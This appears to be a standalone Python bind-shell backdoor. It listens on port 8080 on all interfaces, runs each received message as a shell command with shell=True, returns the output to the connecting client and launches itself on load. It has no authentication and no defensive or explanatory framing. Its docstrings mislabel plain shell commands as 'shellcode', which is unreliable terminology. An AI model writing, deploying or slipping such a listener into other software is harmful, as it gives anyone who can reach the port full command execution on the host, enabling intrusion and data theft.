import socket
import subprocess

def execute_shellcode(shellcode):
    """
    Execute shellcode and return the output of the command.

    Args:
        shellcode (bytes): Shellcode payload to execute.

    Returns:
        str: Output of the command executed by the shellcode.
    """
    try:
        output = subprocess.check_output(shellcode, shell=True)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8')}"

def listener(port):
    """
    Start a socket listener on the specified port to receive shellcode payloads from clients.
    Execute the received shellcode and send back the output.

    Args:
        port (int): Port number to listen on.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"Listening on port {port}")
    while True:
        client_socket, client_address = s.accept()
        print(f"Connection from {client_address}")
        while True:
            shellcode = client_socket.recv(1024)
            if not shellcode:
                break
            output = execute_shellcode(shellcode)
            client_socket.sendall(output.encode())
        client_socket.close()

listener(8080)
